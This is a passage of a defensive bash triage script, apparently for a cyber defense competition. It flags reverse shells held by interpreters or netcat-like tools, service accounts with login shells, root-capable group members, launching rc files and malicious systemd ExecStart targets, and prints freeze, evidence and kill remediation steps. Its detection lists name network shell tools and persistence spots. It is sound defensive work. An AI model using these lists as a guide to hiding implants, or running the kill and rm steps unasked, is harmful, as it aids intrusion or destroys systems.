    case "$exe" in
      *' (deleted)') printf 'its executable was deleted from disk'; return 0 ;;
      /tmp/*|/var/tmp/*|/dev/shm/*) printf 'its executable lives in a world-writable directory'; return 0 ;;
    esac
    base=${exe##*/}
    case "$base" in
      sh|bash|dash|zsh|ksh|busybox|python|python[0-9.]*|perl|ruby|php|lua|lua[0-9.]*|\
      tclsh|expect|nc|nc.openbsd|nc.traditional|ncat|netcat|socat|telnet|awk|gawk|mawk)
        printf 'it is %s - an interpreter, not a service' "$base"; return 0 ;;
    esac
    return 1
  }

  # Buffer the three groups instead of printing as the loop finds them. A busy
  # box interleaves them - RED, then an AMBER, then another RED - and the
  # remediation block for one finding then sits underneath a different finding's
  # heading. On a screen you are reading in a hurry that is not a cosmetic
  # problem: the "run this" commands under a heading have to belong to it.
  #
  # detail() and fix() write fixed indents, so the buffers reproduce them rather
  # than reformatting: the printed output is identical, only the order changes.
  D='         '
  F='           '
  FIXHDR="${D}---- run this ----------------------------------------"
  net_red_buf=''
  net_amber_buf=''
  net_unpkg_buf=''
  seen_sockets=''
  seen_unpackaged=''
  while read -r netid state _ _ local_addr peer rest; do
    [ -n "${rest:-}" ] || continue
    case "$state" in ESTAB|LISTEN|UNCONN) ;; *) continue ;; esac
    # A socket that only ever talks to this machine is not an exfil path and not
    # reachable from a scan. Excluding it is the same call the TCP port check
    # above documents, for the same reason.
    case "$local_addr" in 127.*|'[::1]'*|::1*) continue ;; esac
    case "$peer" in 127.*|'[::1]'*|::1*) continue ;; esac
    [ "$netid" = udp ] && [ "$state" = ESTAB ] && case "$peer" in *:67|*:68) continue ;; esac

    pid=$(printf '%s' "$rest" | grep -oE 'pid=[0-9]+' | head -1 | cut -d= -f2)
    case "$pid" in ''|*[!0-9]*) continue ;; esac
    [ "$pid" = "$$" ] && continue

    exe=$(readlink "/proc/$pid/exe" 2>/dev/null) || exe=''
    [ -n "$exe" ] || continue
    # Our own tooling legitimately runs interpreters, and the guardian chain
    # holds sockets when it probes a scored service. An unclearable RED teaches
    # you to ignore RED.
    own_payload "${exe% (deleted)}" && continue

    local_port=${local_addr##*:}
    peer_port=${peer##*:}
    direction=outbound
    if [ "$state" = LISTEN ] || [ "$state" = UNCONN ]; then
      direction=listening
    elif ccdc_list_contains "$local_port" "$listen_ports"; then
      direction=inbound
    fi

    if reason=$(socket_owner_reason "$exe"); then
      # A python or node web service legitimately listens and legitimately
      # serves inbound sessions. What is never ordinary is that same interpreter
      # reaching OUT, or holding a port nobody put in the packet.
      severity=RED
      if [ "$direction" != outbound ] \
        && ccdc_list_contains "$local_port" "${CCDC_ALLOWED_TCP_PORTS:-} ${CCDC_ALLOWED_UDP_PORTS:-}"; then
        severity=AMBER
      fi
      key="$exe|$direction|$peer"
      case " $seen_sockets " in *" $key "*) continue ;; esac
      seen_sockets="$seen_sockets $key"

      if [ "$severity" = RED ]; then
        emit RED netproc "$exe" "$direction connection held by a process because $reason"
      else
        emit AMBER netprocsvc "$exe" "$direction socket held by a process because $reason"
      fi

      cmd=$(tr '\0' ' ' <"/proc/$pid/cmdline" 2>/dev/null | cut -c1-88)
      started=$(ps -o lstart= -p "$pid" 2>/dev/null | sed 's/^ *//')
      printf -v qpid '%q' "$pid"
      printf -v qevidence '%q' "$state_dir/evidence-pid-$pid"
      entry="${D}pid $pid  $exe"$'\n'
      if [ "$direction" = listening ]; then
        entry="$entry${D}  listening on $local_addr  ($reason)"$'\n'
      else
        entry="$entry${D}  $direction  $local_addr -> $peer  ($reason)"$'\n'
      fi
      [ -n "$cmd" ] && entry="$entry${D}  cmdline: $cmd"$'\n'
      [ -n "$started" ] && entry="$entry${D}  started: $started"$'\n'
      entry="$entry$FIXHDR"$'\n'
      entry="$entry${F}sudo kill -STOP $qpid                      # FREEZE it first - do not kill yet"$'\n'
      entry="$entry${F}sudo mkdir -p -- $qevidence"$'\n'
      entry="$entry${F}sudo cp -- /proc/$qpid/exe $qevidence/exe 2>/dev/null; sudo ls -l /proc/$qpid/exe"$'\n'
      entry="$entry${F}sudo tr '\\0' ' ' < /proc/$qpid/cmdline; echo"$'\n'
      entry="$entry${F}sudo ls -l /proc/$qpid/cwd /proc/$qpid/fd"$'\n'
      entry="$entry${F}ps -o pid,ppid,user,lstart,cmd -p $qpid \$(ps -o ppid= -p $qpid)   # WHO STARTED IT"$'\n'
      entry="$entry${F}sudo kill -9 $qpid"$'\n'
      if [ "$severity" = RED ]; then
        net_red_buf="$net_red_buf$entry"
      else
        net_amber_buf="$net_amber_buf$entry"
      fi
      continue
    fi

    # Tell 3. A binary that no package owns, on the network. This is the one
    # that catches a compiled implant - it is not an interpreter, it is not
    # deleted, and it sits in a respectable-looking directory - and it is also
    # every legitimate from-source install, so it asks rather than accuses.
    #
    # Two shapes qualify: anything reaching OUT, and anything listening on a
    # port the packet does not account for. The second is what covers the UDP
    # ports check 9-ii deliberately stops looking at.
    case "$direction" in
      outbound) ;;
      *)
        ccdc_list_contains "$local_port" "${CCDC_ALLOWED_TCP_PORTS:-} ${CCDC_ALLOWED_UDP_PORTS:-} $stock_udp" \
          && continue
        ;;
    esac
    ccdc_have dpkg-query || ccdc_have rpm || continue
    pkg_owned "$exe" && continue
    case " $seen_unpackaged " in *" $exe "*) continue ;; esac
    seen_unpackaged="$seen_unpackaged $exe"
    if [ "$direction" = outbound ]; then
      emit AMBER netunpackaged "$exe" "outbound connection from an unpackaged binary"
      net_unpkg_buf="$net_unpkg_buf${D}$exe"$'\n'
      net_unpkg_buf="$net_unpkg_buf${D}  pid $pid  outbound $local_addr -> $peer"$'\n'
    else
      emit AMBER netunpackaged "$exe" "unaccounted listening port served by an unpackaged binary"
      net_unpkg_buf="$net_unpkg_buf${D}$exe"$'\n'
      net_unpkg_buf="$net_unpkg_buf${D}  pid $pid  listening on $netid port $local_port"$'\n'
    fi
    printf -v qexe '%q' "$exe"
    net_unpkg_buf="$net_unpkg_buf$FIXHDR"$'\n'
    net_unpkg_buf="$net_unpkg_buf${F}ls -l -- $qexe && $(ccdc_have dpkg-query && printf 'dpkg -S' || printf 'rpm -qf') -- $qexe"$'\n'
    net_unpkg_buf="$net_unpkg_buf${F}sha256sum -- $qexe          # then look it up off the box"$'\n'
  done <<EOF
$(ss -tuanpH 2>/dev/null)
EOF

  if [ -n "$net_red_buf" ]; then
    red "process(es) on the network that should not be on the network   [CARD 12]"
    detail "this is what a memory-only reverse shell looks like: no file, no unit, no listener"
    printf '%s' "$net_red_buf"
  fi
  if [ -n "$net_amber_buf" ]; then
    amber "interpreter(s) holding a port the packet DOES account for   [CARD 12]"
    detail "a scored service can legitimately be a python or php app - confirm each one"
    printf '%s' "$net_amber_buf"
  fi
  if [ -n "$net_unpkg_buf" ]; then
    amber "binary(s) on the network that no package owns   [CARD 12]"
    detail "normal for software built from source; the question is whether YOU know why it is there"
    printf '%s' "$net_unpkg_buf"
  fi
  if [ -z "$net_red_buf$net_amber_buf$net_unpkg_buf" ]; then
    clean "no shell, interpreter, or unpackaged binary holds a socket ($socket_scope)"
  elif [ "$(id -u)" -ne 0 ]; then
    detail "checked $socket_scope"
  fi
fi

# --- 9b. Service accounts that have been handed a login shell -----------------
# A system account (UID under 1000) exists to run a daemon; it has no reason to
# have a shell. Granting one is a quiet, durable foothold that survives password
# resets and appears in none of the checks above - not UID 0, not an empty
# password, not a new account at all. Found on the lab box only because the
# operator happened to run the right `getent` by hand.
begin
svcshell=$(awk -F: '$3>0 && $3<1000 && $7 !~ /(nologin|false|sync)$/ {print $1":"$3":"$7}' /etc/passwd 2>/dev/null)
if [ -n "$svcshell" ]; then
  red "service account(s) with a login shell   [CARD 10]"
  for e in $svcshell; do emit RED svcshell "${e%%:*}" "service account with a login shell"; done
  for e in $svcshell; do
    u=${e%%:*}
    printf -v quser '%q' "$u"
    printf -v qhome '%q' "/home/$u/.ssh/"
    detail "$e"
    fixhdr
    fix "sudo usermod -s /usr/sbin/nologin $quser"
    fix "sudo pkill -u $quser                     # the -u matters: plain pkill matches process NAMES"
    fix "sudo crontab -u $quser -l; sudo ls -la -- $qhome 2>/dev/null"
  done
  detail "do NOT userdel a service account - it probably owns the scored content."
  detail "take the shell away and leave the account."
else
  clean "no service account has a login shell"
fi

# --- 9c. Who can become root -------------------------------------------------
begin
# sudo/wheel/admin grant ROOT. `adm` is deliberately not here: it grants log
# file read access, and `syslog` is in it on every stock Ubuntu, so including it
# made this check fire on a clean box - the exact "cries wolf" failure this
# tool is supposed to avoid.
suspect=()
consider_admin_member() {
  local member=$1 group=$2 uid entry existing duplicate
  [ -n "$member" ] || return 0
  [ "$member" = root ] && return 0
  uid=$(id -u "$member" 2>/dev/null) || return 0

  # A system identity in a root-capable group is always anomalous, even when
  # it is a scored account and therefore protected from automatic action. A
  # human identity is actionable only when the operator supplied an account
  # allow-list and omitted it. Restricting this to root-capable groups and an
  # explicit allow-list keeps ordinary `adm`/log-reader membership quiet.
  if [ "$uid" -ge 1000 ] 2>/dev/null; then
    [ -n "${CCDC_ALLOWED_USERS:-}" ] || return 0
    ccdc_list_contains "$member" "${CCDC_ALLOWED_USERS:-}" && return 0
  fi

  entry="$member/$group"
  duplicate=0
  for existing in "${suspect[@]}"; do
    [ "$existing" = "$entry" ] && duplicate=1 && break
  done
  [ "$duplicate" -eq 1 ] || suspect+=("$entry")
}

for g in sudo wheel admin; do
  group_entry=$(getent group "$g" 2>/dev/null) || continue
  IFS=: read -r _ _ group_gid members <<<"$group_entry"
  IFS=, read -r -a group_members <<<"$members"
  for m in "${group_members[@]}"; do
    consider_admin_member "$m" "$g"
  done

  # NSS group member lists normally contain supplemental members only. A user
  # whose primary GID is sudo/wheel/admin is just as root-capable and must not
  # bypass the check by being absent from the comma-separated member field.
  while IFS=: read -r m _ _ primary_gid _ _ _; do
    [ "$primary_gid" = "$group_gid" ] && consider_admin_member "$m" "$g"
  done < <(passwd_records)
done
if [ "${#suspect[@]}" -gt 0 ]; then
  red "account(s) have unapproved root-capable group membership   [CARD 10]"
  for e in "${suspect[@]}"; do
    emit RED admingroup "$e" "account has unapproved root-capable group membership"
  done
  detail "system accounts are always shown; human accounts are shown when absent from CCDC_ALLOWED_USERS"
  fixhdr
  for e in "${suspect[@]}"; do
    printf -v quser '%q' "${e%%/*}"
    printf -v qgroup '%q' "${e#*/}"
    fix "sudo gpasswd -d $quser $qgroup"
  done
else
  clean "no unapproved account is in sudo/wheel/admin"
fi

# --- 9d. Shell start-up files ------------------------------------------------
# .bashrc, .profile and /etc/profile.d run every time anyone gets a shell -
# including you, the next time you `sudo -i`. A hook here is persistence that
# fires on the defender's own hands, and nothing above reads these files.
# What makes a line in an rc file suspicious is NOT the path it runs. An earlier
# version matched a bare "/usr/local/bin/", which flagged - and then proposed
# deleting - an ordinary `export PATH="$PATH:/usr/local/bin/"`. Measured on the
# lab box: the remediation removed the operator's real PATH line along with the
# implant, and both the detection and the fix were "working as written".
#
# The signal is that a login script LAUNCHES something. A stock .bashrc sets
# variables and defines functions; it does not background a process. So: the
# reverse-shell patterns, execution out of a world-writable directory, or any
# form of detached start.
rc_launch='nohup |setsid |disown|&[[:space:]]*\)|&[[:space:]]*$|/tmp/|/var/tmp/|/dev/shm/'
begin
rchits=''
for f in /root/.bashrc /root/.profile /root/.bash_profile /etc/bash.bashrc /etc/profile \
         /home/*/.bashrc /home/*/.profile /home/*/.bash_profile /etc/profile.d/*; do
  [ -f "$f" ] || continue
  grep -qIE "$shells|$rc_launch" "$f" 2>/dev/null && rchits="$rchits $f"
done
if [ -n "$rchits" ]; then
  red "shell start-up file(s) launching something   [CARD 11]"
  for f in $rchits; do emit RED rcfile "$f" "shell start-up file launching something"; done
  detail "these run on EVERY login, including your next sudo -i"
  for f in $rchits; do
    detail "$f"
    while IFS= read -r l; do detail "    $(printf '%s' "$l" | cut -c1-90)"; done <<EOF
$(grep -IhE "$shells|$rc_launch" "$f" 2>/dev/null | head -3)
EOF
    printf -v qf '%q' "$f"
    printf -v qevidence '%q' "/var/tmp/evidence-$(basename -- "$f")"
    fixhdr
    fix "sudo cp -- $qf $qevidence"
    fix "sudo nano $qf      # delete only the offending line, keep the rest"
  done
else
  clean "no shell start-up file launches anything unusual"
fi

# --- 9d-ii. What the start-up file LAUNCHES ----------------------------------
# Same insight as the unit check below: the hook is the trigger, the payload is
# one level down. A line that runs /usr/local/bin/net-diag looks entirely
# ordinary until you read /usr/local/bin/net-diag.
begin
rcdeep=''
for f in $rchits; do
  for t in $(grep -IhoE '/(usr/local/bin|opt|usr/bin|var|srv)/[A-Za-z0-9._/-]+' "$f" 2>/dev/null | sort -u); do
    [ -f "$t" ] || continue
    own_payload "$t" && continue
    grep -qIE "$shells" "$t" 2>/dev/null && rcdeep="$rcdeep $f::$t"
  done
done
if [ -n "$rcdeep" ]; then
  red "start-up file(s) launching a script that contains a reverse shell   [CARD 11]"
  for e in $rcdeep; do
    f=${e%%::*}; t=${e#*::}
    detail "$f -> $t"
    emit RED rcdeep "$e" "start-up file launching a script containing a reverse shell"
    while IFS= read -r l; do detail "    $(printf '%s' "$l" | cut -c1-88)"; done <<EOF
$(grep -IhE "$shells" "$t" 2>/dev/null | head -2)
EOF
    printf -v qt '%q' "$t"
    printf -v qevidence '%q' "$state_dir/evidence-$(basename -- "$t")"
    fixhdr
    fix "sudo cp -- $qt $qevidence && sudo rm -f -- $qt"
  done
else
  clean "no start-up file launches a script containing a reverse shell"
fi

# --- 9e. Units whose ExecStart TARGET is malicious ---------------------------
# Check 5 reads the unit. An attacker who puts a clean path in ExecStart and
# hides the payload one level down in that script passes it completely. On the
# lab box net-diag.service pointed at /usr/local/bin/net-diag - an ordinary
# path in an ordinary directory - and the reverse shell was inside the file.
# Following the path IS the check.
begin
unit_exec_commands() {
  # Join systemd continuation lines, then print every ExecStart command. This
  # is a parser, never an evaluator: specifiers and variables remain literal
  # and therefore cannot make this tool execute attacker-controlled content.
  awk '
    {
      part=$0
      if (part ~ /\\$/) {
        sub(/\\$/, "", part)
        joined=joined part " "
        next
      }
      joined=joined part
      if (joined ~ /^[[:space:]]*Exec[A-Za-z]*=/) {
        sub(/^[[:space:]]*Exec[A-Za-z]*=/, "", joined)
        print joined
      }
      joined=""
    }
    END {
      if (joined ~ /^[[:space:]]*Exec[A-Za-z]*=/) {
        sub(/^[[:space:]]*Exec[A-Za-z]*=/, "", joined)
        print joined
      }
    }
  ' "$1" 2>/dev/null
}

deephits=()
for unit in /etc/systemd/system/*.service /run/systemd/system/*.service \
            /etc/systemd/system/*.service.d/*.conf /run/systemd/system/*.service.d/*.conf \
            /etc/systemd/system/*.timer.d/*.conf /run/systemd/system/*.timer.d/*.conf; do
  [ -f "$unit" ] || continue
  while IFS= read -r command || [ -n "$command" ]; do
    targets=()
    while IFS= read -r target; do
      [ -n "$target" ] && targets+=("$target")
    done < <(printf '%s\n' "$command" | absolute_tokens)
    [ "${#targets[@]}" -gt 0 ] || continue

    primary=${targets[0]}
    follow_args=0
    for target in "${targets[@]}"; do
      is_launch_wrapper "$target" && follow_args=1
    done
    # Also recognise a relative interpreter following /usr/bin/env or another
    # wrapper. Word boundaries keep names such as `node_exporter` from turning
    # an unrelated argument into a launch target.
    printf '%s\n' "$command" | grep -qE "(^|[[:space:]\"'])(sh|bash|dash|zsh|ksh|python[0-9.]*|perl|ruby|php|node)([[:space:]\"']|$)" && follow_args=1

    for target in "${targets[@]}"; do
      [ -f "$target" ] || continue
      [ "$target" = "$primary" ] || [ "$follow_args" -eq 1 ] || continue
      own_payload "$target" && continue
      grep -qIE "$shells" "$target" 2>/dev/null || continue
      case "$unit" in
        *.service.d/*.conf|*.timer.d/*.conf)
          parent=$(basename -- "$(dirname -- "$unit")")
          owner=${parent%.d}
          hit="$owner::$unit::$target"
          ;;
        *) hit="$unit::$target" ;;
      esac
      duplicate=0
      for existing in "${deephits[@]}"; do
        [ "$existing" = "$hit" ] && duplicate=1 && break
      done
      [ "$duplicate" -eq 1 ] || deephits+=("$hit")
    done
  done < <(unit_exec_commands "$unit")
done
if [ "${#deephits[@]}" -gt 0 ]; then
  red "unit(s) whose ExecStart script contains a reverse shell   [CARD 4]"
  detail "the unit itself looks clean - the payload is one level down"
  for e in "${deephits[@]}"; do
    rest=${e#*::}
    if [ "$rest" != "$e" ] && case "$rest" in *::* ) true ;; *) false ;; esac; then
      owner=${e%%::*}; unit=${rest%%::*}; target=${rest#*::}; u=$owner; base=${u%.service}
      detail "$u drop-in $unit -> $target"
      if machine_triple_safe "$owner" "$unit" "$target"; then
        emit RED unitdropindeep "$e" "unit drop-in whose ExecStart script contains a reverse shell"
      else
        ccdc_warn "omitted an ambiguous unitdropindeep subject from the machine queue; inspect the human triage output"
      fi
    else
      unit=${e%%::*}; target=${e#*::}; u=$(basename -- "$unit"); base=${u%.service}
      detail "$u -> $target"
      if machine_pair_safe "$unit" "$target"; then
        emit RED unitdeep "$e" "unit whose ExecStart script contains a reverse shell"
      else
        ccdc_warn "omitted an ambiguous unitdeep subject from the machine queue; inspect the human triage output"
      fi
    fi
    while IFS= read -r l; do detail "    $(printf '%s' "$l" | cut -c1-90)"; done \
      < <(grep -IhE "$shells" "$target" 2>/dev/null | head -2)
    printf -v qunit '%q' "$unit"
    printf -v qtarget '%q' "$target"
    printf -v qevidence '%q' "/var/tmp/evidence-$(basename "$target")"
    printf -v qunit_name '%q' "$u"
    fixhdr
    case "$unit" in
      *.service.d/*.conf|*.timer.d/*.conf)
        printf -v qunit_evidence '%q' "/var/tmp/evidence-$(basename -- "$unit")"
        fix "sudo systemctl cat -- $qunit_name"
        fix "sudo cp -- $qunit $qunit_evidence"
        fix "sudo cp -- $qtarget $qevidence"
        fix "sudo rm -f -- $qunit $qtarget"
        fix "sudo systemctl daemon-reload && sudo systemctl try-restart -- $qunit_name"
        ;;
      *)
        printf -v qtimer '%q' "/etc/systemd/system/$base.timer"
        printf -v qtimer_name '%q' "$base.timer"
        fix "sudo systemctl disable --now -- $qtimer_name $qunit_name"
        fix "sudo cp -- $qtarget $qevidence"
        fix "sudo rm -f -- $qunit $qtimer $qtarget"
        fix "sudo systemctl daemon-reload && sudo systemctl reset-failed"
        ;;
    esac
  done
else
  clean "no unit's ExecStart script contains a reverse shell"
fi

# --- 10. Very recently modified /etc ------------------------------------------
# Last, and only AMBER, because early in an event most hits are yours. It earns
# its place later, when you know you changed nothing in the last ten minutes.
begin
recent=$(find /etc -xdev -type f -mmin -30 2>/dev/null | grep -vE '/(mtab|resolv.conf|adjtime|.*\.lock)$' | head -8)
if [ -n "$recent" ]; then
  amber "/etc file(s) modified in the last 30 minutes   [CARD 9]"
  emit AMBER etcchange "see-log" "/etc changed recently"
  detail "if you did not change these, someone else did"
  for f in $recent; do detail "$(date -r "$f" '+%H:%M') $f"; done
else
  clean "no /etc changes in the last 30 minutes"
fi

# --- verdict ------------------------------------------------------------------

printf '\n'
if [ "$findings" -eq 0 ]; then
  printf '  %s checks, nothing flagged.\n\n' "$checks"
  printf '  This is NOT "the box is clean". It means the high-confidence checks\n'
  printf '  found nothing. A competent attacker who is already root can pass all\n'
  printf '  of them. Keep watch.sh running and keep reading hunt.sh.\n'
else
  printf '  %s checks, %s finding(s) above.\n\n' "$checks" "$findings"
  printf '  Work RED first. For each one, find the way back in as well as the\n'
  printf '  artifact - an added user, a key, a cron entry, a unit - or you will\n'
  printf '  clean it up and meet it again in ten minutes.\n'
  printf '  Write down what you found and when. That is the incident-report\n'
  printf '  inject, already half-composed.\n'
  printf '\n  EXACT COMMANDS for each [CARD n] above:\n'
  printf '      ./linux/card.sh <n> <name-or-path>     e.g. ./linux/card.sh 1 backupsvc\n'
  printf '  Reads the card in this terminal with the real value filled in. Do NOT\n'
  printf '  cat or paste playbooks/remediation-cards.md - it is markdown, and bash\n'
  printf '  will try to execute the prose.\n'
fi
# The staging file was created before any checks and every append was checked.
# A same-directory rename is the only publication step, so sentry sees either
# the complete previous pass or this complete pass, never a partial record set.
if ! mv -f -- "$findings_tmp" "$findings_file"; then
  ccdc_die "cannot atomically finalize findings file: $findings_file"
fi
findings_tmp=''

printf '\n  Full detail, if you want it: ./linux/hunt.sh and ./linux/recon.sh\n'
[ "$findings" -gt 0 ] && exit 3
exit 0
